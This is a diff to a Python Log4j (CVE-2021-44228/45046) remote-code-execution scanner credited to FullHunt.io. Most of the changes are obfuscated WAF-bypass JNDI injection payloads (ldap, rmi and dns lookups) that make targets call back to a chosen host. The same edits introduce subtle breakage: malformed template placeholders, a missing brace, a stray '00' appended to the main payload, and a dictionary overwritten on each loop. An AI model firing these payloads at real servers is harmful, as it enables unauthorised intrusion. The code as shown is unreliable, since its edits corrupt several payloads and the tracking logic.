@@ -32,6 +32,7 @@ except Exception:
     pass
 
 dns_call_back_list =[]
+domain_url_dict = {}
 
 cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
 cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
@@ -51,35 +52,35 @@ default_headers = {
 post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
 timeout = 4
 
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}/",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{{callback_host}}/{{random}}}",
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://0.{{callback_host}}/{{random}}}",
+                       "${${::-j}ndi:rmi://1.{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://2.{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://3.{{callback_host}}}/",
+                       "${${lower:jndi}:${lower:rmi}://{{4.callback_host}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://5.{{callback_host}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://6.{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://7.{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}/{{random}}}",
-                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}",
-                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
-                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
-                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
-                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
-                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
-                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
-                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
-                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
-                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
-                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
-                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
-                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
+                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://8.{{callback_host}}/{{random}}}",
+                       "${jndi:dns://9.{{callback_host}}}",
+                       "${j${k8s:k5:-ND}i:ldap://10.{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//11.{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://12.{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//13.{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://14.{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//15.{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//16.{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//17.{{callback_host}}/{{random}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//18.{{callback_host}}/{{random}}}",
+                       "${jndi:${lower:l}${lower:d}a${lower:p}://19.{{callback_host}}}",
+                       "${jnd${upper:i}:ldap://20.{{callback_host}}/{{random}}}",
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://21.{{callback_host}}/{{random}}}"
                        ]
 
 cve_2021_45046 = [
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
-                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
+                  "${jndi:ldap://127.0.0.1#c1{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+                  "${jndi:ldap://127.0.0.1#c2{{callback_host}}/{{random}}}",
+                  "${jndi:ldap://127.1.1.1#c3{{callback_host}}/{{random}}}"
                  ]
 
 parser = argparse.ArgumentParser()
@@ -365,7 +366,7 @@ def parse_url(url):
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payload = '${jndi:ldap://%s.%s/%s}00' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
@@ -463,7 +464,9 @@ def main():
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, get_dns_callback_domain())
+        callback_domain = get_dns_callback_domain()
+        domain_url_dict = {callback_domain : url}
+        scan_url(url, callback_domain)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
@@ -482,6 +485,7 @@ def main():
                 cprint("[!!!] Targets Affected", "yellow")
                 for i in records:
                     cprint(json.dumps(i), "yellow")
+        print(domain_url_dict)
         '''
         if len(records) == 0:
             cprint("[•] Targets do not seem to be vulnerable.", "green")
